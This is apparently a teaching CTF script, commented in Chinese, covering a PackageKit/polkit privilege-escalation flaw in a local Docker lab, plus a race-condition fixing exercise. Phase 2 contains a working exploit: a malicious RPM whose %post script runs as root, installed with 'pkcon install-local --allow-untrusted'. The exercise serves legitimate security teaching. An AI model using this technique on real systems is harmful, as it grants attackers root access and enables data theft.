#!/usr/bin/env python3
"""
Week 12 — Pack2TheRoot 互動式 CTF 實戰平台
============================================
在本平台中完成三道挑戰，即可獲得全部 3 個 CTF Flag。

旗幟發放機制：唯有通過互動驗證，系統才會釋出 Flag。
光是對 container 下指令無法取得旗幟——互動驗證本身就是奪旗流程。

關卡架構：
  Phase 1（Flag 1 🟢）— 回答系統偵察問題，驗證通過後獲得
  Phase 2（Flag 2 🟡）— 自動化攻擊 + 回讀驗證，確認 root 後獲得
  Phase 3（Flag 3 🔴）— 實作 safe_execute()，通過壓力測試後獲得

進度自動儲存。隨時可離開，下次執行自動從中斷處繼續。
"""

import os
import sys
import re
import time
import json
import shutil
import subprocess
from pathlib import Path

# ─────────────────────────────────────────────────────────
# 設定常數
# ─────────────────────────────────────────────────────────
LAB_DIR = Path("/tmp/pack2theroot-lab")
PROGRESS_FILE = Path("/tmp/.w12_ctf_progress.json")
FLAGS_FILE = Path("/tmp/.w12_ctf_flags.json")
VULN_PORT = 2222
PATCH_PORT = 2223
SSH_USER = "labuser"
SSH_PASS = "labuser"
import secrets

C = {
    "green": "\033[92m", "red": "\033[91m", "yellow": "\033[93m",
    "cyan": "\033[96m", "bold": "\033[1m", "dim": "\033[2m",
    "reset": "\033[0m",
}

FLAG_TEMPLATES = {
    1: ("🟢", "W12{{p0lk1t_c0nff1g_n0_4uth_{}}}"),
    2: ("🟡", "W12{{pk0n_1s_n0t_p0l1cy_{}}}"),
    3: ("🔴", "W12{{l0ck_th3_st4t3_m4ch1n3_{}}}"),
}

BANNER = r"""
╔══════════════════════════════════════════════════════╗
║  🛡  Week 12 — Pack2TheRoot  |  CVE-2026-41651     ║
║  完成三道挑戰，奪取全部 CTF 旗幟                      ║
╚══════════════════════════════════════════════════════╝
"""


# ─────────────────────────────────────────────────────────
# 公用函式
# ─────────────────────────────────────────────────────────

def c(k, t):
    return f"{C.get(k, '')}{t}{C['reset']}"

def ssh(port, cmd, timeout=30):
    """透過 SSH 執行指令，回傳 stdout"""
    if shutil.which("sshpass"):
        full_cmd = ["sshpass", "-p", SSH_PASS, "ssh",
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "LogLevel=ERROR",
            "-p", str(port), f"{SSH_USER}@localhost", cmd]
        r = subprocess.run(full_cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip()
    try:
        import pexpect
    except ImportError:
        print(c("red", "需要 sshpass 或 pexpect。安裝方式：pip3 install pexpect"))
        sys.exit(1)
    safe = cmd.replace("'", "'\\''")
    child = pexpect.spawn(
        f"ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
        f"-o LogLevel=ERROR -p {port} {SSH_USER}@localhost '{safe}'", timeout=timeout)
    child.expect("password:", timeout=10)
    child.sendline(SSH_PASS)
    child.expect(pexpect.EOF, timeout=timeout)
    return child.before.decode().strip().replace("\r\n", "\n").replace("\r", "\n")

def load_json(path):
    if path.exists():
        return json.loads(path.read_text())
    return {}

def save_json(path, data):
    path.write_text(json.dumps(data, indent=2, ensure_ascii=False))

def progress():
    return load_json(PROGRESS_FILE)

def set_progress(key, val=True):
    p = progress()
    p[key] = val
    save_json(PROGRESS_FILE, p)

def is_done(key):
    return progress().get(key, False)

def clear():
    os.system("clear" if os.name == "posix" else "cls")

def divider(title=""):
    w = shutil.get_terminal_size().columns
    print(c("dim", "─" * w))
    if title:
        print(f"  {c('bold', title)}")
        print(c("dim", "─" * w))

def choice(prompt, opts):
    """多選一選擇題"""
    print(f"\n{c('cyan', prompt)}")
    for k, v in opts.items():
        print(f"  {c('bold', k)}) {v}")
    while True:
        a = input(f"{c('yellow', '→ ')}").strip().lower()
        if a in opts:
            return a
        print(c("red", f"  請選擇：{', '.join(opts.keys())}"))

def ask(question, pattern, hint, max_attempts=5):
    """問答題，支援正規表示法比對與漸進提示"""
    for attempt in range(1, max_attempts + 1):
        ans = input(f"\n{c('cyan', question)}\n{c('yellow', '→ ')}").strip()
        m = re.search(pattern, ans, re.IGNORECASE)
        if m:
            return m
        remaining = max_attempts - attempt
        if remaining == 0:
            print(c("red", f"  正確答案：{hint}"))
            return None
        elif attempt >= 3:
            print(c("yellow", f"  提示：{hint}（剩 {remaining} 次）"))
        else:
            print(c("red", f"  不對喔。再試一次。（剩 {remaining} 次）"))
    return None

def press_enter():
    input(f"\n{c('dim', '按 Enter 繼續...')}")

def celebrate(flag_num, flag_text):
    """奪旗成功畫面"""
    emoji, template = FLAG_TEMPLATES[flag_num]
    print()
    print(c("green", f"╔══════════════════════════════════════════════════════╗"))
    print(c("green", f"║  🏁  FLAG {flag_num} 奪取成功！                           ║"))
    print(c("green", f"║                                                  ║"))
    print(c("bold",  f"║  {flag_text}  ║"))
    print(c("green", f"║                                                  ║"))
    print(c("green", f"╚══════════════════════════════════════════════════════╝"))
    print()
    flags = load_json(FLAGS_FILE)
    flags[f"flag_{flag_num}"] = flag_text
    save_json(FLAGS_FILE, flags)
    set_progress(f"flag_{flag_num}")

def show_flag_report():
    """顯示已奪取的旗幟（供報告截圖使用）"""
    flags = load_json(FLAGS_FILE)
    print(c("bold", "\n===== 已奪取旗幟清單 ====="))
    for i in range(1, 4):
        f = flags.get(f"flag_{i}")
        if f:
            print(c("green", f"  Flag {i}: {f}"))
        else:
            print(c("red", f"  Flag {i}: 尚未奪取"))
    print(c("bold", "==========================="))


# ─────────────────────────────────────────────────────────
# Phase 1 — 系統偵察（Flag 1 🟢）
# ─────────────────────────────────────────────────────────

def phase1():
    divider("🟢 Phase 1/3 — 系統偵察（奪取 Flag 1）")

    if is_done("flag_1"):
        print(c("yellow", "  Flag 1 已奪取！"))
        return True

    print("""│
挑戰目標：找出導致 Pack2TheRoot 漏洞的 polkit 設定錯誤。
│
你將 SSH 進入有漏洞的 container，檢查 polkit 授權規則。
正確回答所有問題後，系統將釋出 Flag 1。
""")

    if not is_done("env"):
        print(c("yellow", "  正在執行環境檢查..."))
        if not check_env():
            return False

    # ── Q1: PackageKit 版本 ──
    ver = ssh(VULN_PORT, "pkcon --version", timeout=10)
    print(f"\n  PackageKit 版本：{c('bold', ver)}")
    if not ask("Q1：此版本是否在受影響範圍 [1.0.2 - 1.3.4] 內？（yes/no）", r"(yes|y|是)", "是的！1.2.8 落在受影響範圍內。"):
        return False
    print(c("green", "  ✓ 正確！\n"))

    # ── Q2: 找出寬鬆的 action ──
    print("  系統有一個自訂的 polkit JavaScript 規則檔放在 /etc/polkit-1/rules.d/")
    action = ssh(VULN_PORT, "pkaction --verbose --action-id org.freedesktop.packagekit.package-install-untrusted", timeout=10)
    print(f"  預設政策顯示：{c('dim', action[:80])}...")

    r = ssh(VULN_PORT, "cat /etc/polkit-1/rules.d/10-pack2theroot-lab-misconfig.rules", timeout=10)
    print(f"\n  自訂規則內容：\n{c('dim', r)}")

    if not ask("Q2：自訂 polkit 規則對 package-install-untrusted 回傳什麼值？", r"(yes|result\.yes)", "polkit.Result.YES——不須任何認證就允許安裝！"):
        return False
    print(c("green", "  ✓ 正確！\n"))

    # ── Q3: 資安意識 ──
    if not ask("Q3：`pkcon install-local --allow-untrusted` 可以用來安裝什麼類型的套件？", r"(未簽章|未受信任|本機|unsign|untrust|local|rpm|任意|惡意|evil|malicious)", "未受信任的本機套件——其 %post 脚本會以 root 權限執行任意程式碼"):
        return False

    # ── 產出 Flag 1 ──
    suffix = secrets.token_hex(4)
    flag = FLAG_TEMPLATES[1][1].format(suffix)
    celebrate(1, flag)
    return True


# ─────────────────────────────────────────────────────────
# Phase 2 — 漏洞利用（Flag 2 🟡）
# ─────────────────────────────────────────────────────────

def phase2():
    divider("🟡 Phase 2/3 — 漏洞利用（奪取 Flag 2）")

    if is_done("flag_2"):
        print(c("yellow", "  Flag 2 已奪取！"))
        return True

    if not is_done("flag_1"):
        print(c("red", "  你必須先完成 Phase 1（Flag 1）！"))
        return False

    print("""│
挑戰目標：利用寬鬆的 polkit 規則進行權限提升，
讀取 container 中的 /root/flag.txt。

你將建立一個惡意 RPM 套件，其 %post 脚本會以 root
身分執行，將旗幟檔案複製出來。
""")

    # ── Q1: 套件格式 ──
    fmt = choice("Container 執行 Fedora 40，使用哪種套件格式？",
                 {"rpm": "RPM（Red Hat 格式）", "deb": "DEB（Debian 格式）"})
    if fmt != "rpm":
        print(c("red", "  Fedora 使用 RPM！回到選單。"))
        return False

    if not ask("Q2：哪個 pkcon 參數允許安裝未簽章的本機套件？（一個單字）", r"(allow-untrusted|--allow-untrusted)", "--allow-untrusted"):
        return False

    # ── 建立惡意 RPM ──
    print(c("bold", "\n  正在 container 中建立惡意 RPM..."))
    build_cmd = """
cat > /tmp/evil.spec << 'SPECEOF'
Name:           lab-evil-pkg
Version:        1.0
Release:        1
Summary:        CTF
License:        MIT
BuildArch:      noarch
%description
CVE-2026-41651
%prep
echo x > README
%build
%install
mkdir -p %{buildroot}
%post
cat /root/flag.txt > /tmp/flag_captured.txt
chmod 644 /tmp/flag_captured.txt
id >> /tmp/flag_captured.txt
%files
%doc README
%changelog
* now - test
SPECEOF
mkdir -p ~/rpmbuild/{BUILD,RPMS,SOURCES,SPECS,SRPMS}
rpmbuild -bb /tmp/evil.spec 2>&1
"""
    out = ssh(VULN_PORT, build_cmd, timeout=30)
    if "Wrote:" not in out:
        print(c("red", f"  RPM 建立失敗：\n{out}"))
        return False
    print(c("green", "  ✓ RPM 建立成功！"))

    # ── 安裝套件 ──
    print(c("bold", "\n  透過 pkcon 安裝..."))
    install_out = ssh(VULN_PORT,
        "pkcon install-local --allow-untrusted ~/rpmbuild/RPMS/noarch/lab-evil-pkg-1.0-1.fc40.noarch.rpm 2>&1",
        timeout=60)
    if "Installed" not in install_out:
        print(c("red", f"  安裝失敗：\n{install_out}"))
        return False
    print(c("green", "  ✓ 套件已安裝！%post 脚本已以 root 身分執行。"))

    # ── 讀取旗幟 ──
    captured = ssh(VULN_PORT, "cat /tmp/flag_captured.txt 2>/dev/null", timeout=10)
    print("\n  %post 脚本已將旗幟寫入 /tmp/flag_captured.txt")
    print(f"  內容：{c('bold', captured)}")

    if "uid=0" not in captured:
        print(c("red", "  未確認 root 執行身分。"))
        return False

    print(c("green", "  ✓ 確認以 root (uid=0) 執行！"))

    # ── Q3: 理解測驗 ──
    if not ask("Q3：為什麼 %post 脚本能以 root 權限執行？（提示：誰在執行 PackageKit daemon？）",
               r"(root|daemon|packagekit)", "PackageKit daemon 以 root 身分執行，因此安裝脚本繼承了 root 權限"):
        return False

    # ── 產出 Flag 2 ──
    suffix = secrets.token_hex(4)
    flag = FLAG_TEMPLATES[2][1].format(suffix)
    celebrate(2, flag)
    print(f"\n  container 原始旗幟（供報告截圖）：{c('bold', captured)}")
    return True


# ─────────────────────────────────────────────────────────
# Phase 3 — 防禦實作（Flag 3 🔴）
# ─────────────────────────────────────────────────────────

def phase3():
    divider("🔴 Phase 3/3 — 防禦實作（奪取 Flag 3）")

    if is_done("flag_3"):
        print(c("yellow", "  Flag 3 已奪取！"))
        return True

    if not is_done("flag_2"):
        print(c("red", "  你必須先完成 Phase 2（Flag 2）！"))
        return False

    print("""│
挑戰目標：完成 transaction_demo.py 中的 safe_execute() 函式，
消除 race condition。

脆弱版本在 1000 輪壓力測試中會出現約 990 次負數餘額。
你的實作必須將此數字降為零。
""")

    # ── 執行脆弱版本 ──
    print(c("bold", "步驟 1：觀察脆弱版本的行為"))
    r = subprocess.run([sys.executable, "transaction_demo.py", "--vulnerable"],
                       capture_output=True, text=True, timeout=30)
    for line in r.stdout.split("\n"):
        if "負數" in line or "超過" in line:
            print(f"  {line.strip()}")

    neg_match = re.search(r"負數[：:]\s*(\d+)", r.stdout)
    neg_count = int(neg_match.group(1)) if neg_match else 0

    if neg_count < 100:
        print(c("yellow", f"  預期約 990 次負數，實際 {neg_count}。"))
        print(c("dim", r.stdout[:500]))

    if not ask("Q1：脆弱版本是否存在 race condition？（yes/no）", r"(yes|y|是)", "1000 輪中有約 990 次出現負數餘額"):
        return False

    # ── 要求學生實作修補 ──
    print(c("bold", "\n步驟 2：實作 safe_execute()"))
    print("""
  開啟 transaction_demo.py，找到 safe_execute() 方法。
  目前它只回傳 False（佔位符）。

  使用以下任一種方式修復：
    A）使用 threading.Lock()——讓檢查和扣款成為原子操作
    B）使用 compare-and-swap——執行前重新讀取狀態
    C）sleep 之後重新驗證狀態，若已改變則中止

  關鍵觀念：狀態檢查（self.state != AUTHORIZED）和
  扣款（self.balance -= amount）必須是不可分割的操作。
""")

    input(f"{c('yellow', '編輯完成 safe_execute() 並存檔後，按 Enter 繼續')}")

    # ── 執行安全版本 ──
    print(c("bold", "\n  測試你的實作..."))
    r = subprocess.run([sys.executable, "transaction_demo.py", "--safe"],
                       capture_output=True, text=True, timeout=30)
    print(f"  {r.stdout}")

    neg = re.search(r"負數[：:]\s*(\d+)", r.stdout)
    double = re.search(r"執行超過一次[：:]\s*(\d+)", r.stdout)
    neg_count = int(neg.group(1)) if neg else 999
    double_count = int(double.group(1)) if double else 999

    if neg_count > 0 or double_count > 0:
        print(c("red", f"  ❌ 仍有 race：{neg_count} 次負數，{double_count} 次重複執行。"))
        print(c("yellow", "  提示：將檢查和執行都包在 'with self.lock:' 區塊內"))
        return False

    print(c("green", "  ✓ 1000 輪全部通過！無任何 race condition。"))

    # ── Q2: 理解測驗 ──
    if not ask("Q2：你用了哪一種方法？（lock / re-read / cas）",
               r"(lock|重新讀取|re-?read|compare-?and-?swap|cas|atomic|原子)",
               "threading.Lock()——進入 mutex 確保同一時間只有一個執行緒能檢查並扣款"):
        return False

    # ── 產出 Flag 3 ──
    suffix = secrets.token_hex(4)
    flag = FLAG_TEMPLATES[3][1].format(suffix)
    celebrate(3, flag)
    return True


# ─────────────────────────────────────────────────────────
# 環境檢查
# ─────────────────────────────────────────────────────────

def check_env():
    divider("🔧 環境檢查")
    ok = True

    if not shutil.which("docker"):
        print(c("red", "  ✗ 找不到 Docker"))
        return False
    print(c("green", "  ✓ Docker 已安裝"))

    if not LAB_DIR.exists():
        print(c("red", f"  ✗ 找不到實驗室目錄 {LAB_DIR}"))
        print("    請執行：git clone https://github.com/dinosn/pack2theroot-lab.git")
        return False
    print(c("green", "  ✓ 實驗室目錄存在"))

    r = subprocess.run(["docker", "compose", "ps", "--format", "json"],
                       capture_output=True, text=True, timeout=15, cwd=str(LAB_DIR))
    if "pack2theroot-vuln" not in r.stdout:
        print(c("red", "  ✗ 有漏洞的 container 未執行"))
        print("    請執行：cd pack2theroot-lab && docker compose up -d")
        return False
    print(c("green", "  ✓ Container 正在執行"))

    try:
        ver = ssh(VULN_PORT, "pkcon --version", timeout=10)
        print(c("green", f"  ✓ 可 SSH 進入有漏洞的 container（PackageKit {ver}）"))
    except Exception as e:
        print(c("red", f"  ✗ 無法 SSH：{e}"))
        return False

    try:
        ssh(PATCH_PORT, "whoami", timeout=10)
        print(c("green", "  ✓ 可 SSH 進入已修補的 container"))
    except Exception:
        print(c("yellow", "  ⚠ 已修補 container 無法連接（非必要）"))

    set_progress("env")
    print(c("green", "\n  ✓ 環境就緒！"))
    return True


# ─────────────────────────────────────────────────────────
# 進度總覽
# ─────────────────────────────────────────────────────────

def summary():
    divider("🏁 CTF 奪旗進度")
    flags = load_json(FLAGS_FILE)
    for i in range(1, 4):
        f = flags.get(f"flag_{i}")
        if f:
            print(c("green", f"  🏁  Flag {i}：{f}"))
        else:
            print(c("red", f"  🏁  Flag {i}：尚未奪取"))

    p = progress()
    done = sum(1 for i in range(1, 4) if p.get(f"flag_{i}"))
    print(f"\n  {c('bold', f'已奪取 {done}/3 面旗幟')}")
    if done == 3:
        print(c("green", "\n  🎉 全數奪取！請使用範本撰寫滲透測試報告。"))
        print(c("dim", "     範本：pentest-report-template.md"))
        print(c("dim", "     旗幟已儲存於：/tmp/.w12_ctf_flags.json"))


# ─────────────────────────────────────────────────────────
# 主程式
# ─────────────────────────────────────────────────────────

def main():
    clear()
    print(c("cyan", BANNER))

    phases = [
        ("1", "🟢  系統偵察    → Flag 1",     phase1),
        ("2", "🟡  漏洞利用    → Flag 2",     phase2),
        ("3", "🔴  防禦實作    → Flag 3",     phase3),
        ("e", "🔧  環境檢查",                 check_env),
        ("s", "🏁  顯示已奪取旗幟",           summary),
        ("r", "🔄  重設全部進度",             None),
        ("q", "❌  離開",                     None),
    ]

    while True:
        print()
        for key, label, _ in phases:
            if key in ("1","2","3"):
                flag_key = f"flag_{key}"
                done = is_done(flag_key)
                icon = c("green", "🏁") if done else "  "
                print(f"  [{key}] {icon} {label}")
            else:
                print(f"  [{key}]    {label}")
        print()

        choice = input(f"{c('yellow', '請選擇 → ')}").strip().lower()

        if choice == "q":
            summary()
            print(c("dim", "\n進度已儲存。下次執行可繼續。\n"))
            break
        elif choice == "r":
            PROGRESS_FILE.unlink(missing_ok=True)
            FLAGS_FILE.unlink(missing_ok=True)
            print(c("yellow", "  進度已重設。"))
            continue
        elif choice == "s":
            summary()
            press_enter()
            clear()
            continue
        elif choice == "e":
            clear()
            check_env()
            press_enter()
            clear()
            continue
        elif choice in ("1","2","3"):
            fn = phases[int(choice)-1][2]
            clear()
            try:
                if fn():
                    print(c("green", "\n  ✓ 關卡完成！"))
                else:
                    print(c("yellow", "\n  ⚠ 關卡未完成。再試一次。"))
            except KeyboardInterrupt:
                print(c("yellow", "\n  已中斷。"))
            except Exception as e:
                print(c("red", f"\n  錯誤：{e}"))
            press_enter()
            clear()

if __name__ == "__main__":
    main()
